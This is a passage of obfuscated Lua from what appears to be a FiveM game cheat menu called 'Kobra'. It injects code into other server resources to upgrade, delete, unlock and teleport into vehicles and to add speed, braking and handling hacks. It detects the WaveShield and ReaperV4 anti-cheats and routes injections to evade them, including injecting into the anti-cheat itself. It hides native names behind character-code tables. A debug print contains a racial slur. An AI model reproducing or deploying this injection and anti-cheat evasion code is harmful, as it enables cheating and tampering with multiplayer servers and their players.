                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() local v464=0;local v465;local v466;while true do if (v464==(3 -2)) then v466=GetResourceState("ReaperV4")=="started" ;if v465 then local v895=0 -0 ;while true do if (v895==(0 + 0)) then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end elseif v466 then print("using Reaper fallback");MachoInjectThread(249 -(197 + 52) ,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end break;end if ((0 -0)==v464) then v12:Notify("success","Kobra","Vehicle Max Upgraded",6832 -3832 );v465=GetResourceState("WaveShield")=="started" ;v464=1 + 0 ;end end end},{type="button",label="Delete Vehicle",onSelect=function() local v467=0;while true do if (v467==(0 + 0)) then v12:Notify("success","Kobra","Deleted Vehicle",5350 -2350 );MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v468=0 -0 ;while true do if (v468==(0 -0)) then v12:Notify("success","Kobra","Deleted Vehicle",1162 + 1838 );MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() local v469=1097 -(97 + 1000) ;while true do if (v469==0) then v12:Notify("success","Kobra","Teleported into Vehicle",3000);MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);break;end end end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v470) if v470 then v12:Notify("success","Kobra","Boost Vehicle On",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end else local v617=0 -0 ;while true do if (v617==0) then v12:Notify("error","Kobra","Boost Vehicle Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v48("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v471) local v472=GetResourceState("WaveShield")=="started" ;local v473=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v471 then if v472 then local v811=0;while true do if (v811==(369 -(40 + 329))) then v12:Notify("success","Kobra","Instant Brakes On",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v812=0 + 0 ;while true do if (v812==0) then v48(v473,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",1046 + 1954 );break;end end end elseif v472 then local v813=0;while true do if (v813==(0 -0)) then v12:Notify("success","Kobra","Instant Brakes Off",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else local v814=0 + 0 ;while true do if (v814==(65 -(9 + 56))) then v48(v473,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",3584 -(531 + 53) );break;end end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v474) local v475=0;local v476;local v477;while true do if (v475==0) then v476=GetResourceState("WaveShield")=="started" ;v477=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v475=1 + 0 ;end if (v475==(774 -(89 + 684))) then if v474 then if v476 then local v1046=0 + 0 ;while true do if (v1046==0) then v12:Notify("success","Kobra","Easy Handling On",984 + 2016 );MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v1047=0;while true do if (0==v1047) then v48(v477,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",830 + 2170 );break;end end end elseif v476 then local v1048=0 -0 ;while true do if (v1048==0) then v12:Notify("success","Kobra","Easy Handling Off",2215 + 785 );MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);break;end end else local v1049=0 + 0 ;while true do if (v1049==0) then v48(v477,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",3613 -(238 + 375) );break;end end end break;end end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v478) local v479=0 -0 ;local v480;while true do if (v479==(0 + 0)) then v480=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v478 then local v896=0 -0 ;while true do if (0==v896) then v12:Notify("success","Kobra","Rainbow Vehicle On",7903 -4903 );if (GetResourceState("WaveShield")=="started") then local v1245=0 -0 ;while true do if ((0 -0)==v1245) then print("souygdfg");v48(v480,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);break;end end else v48(v480,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
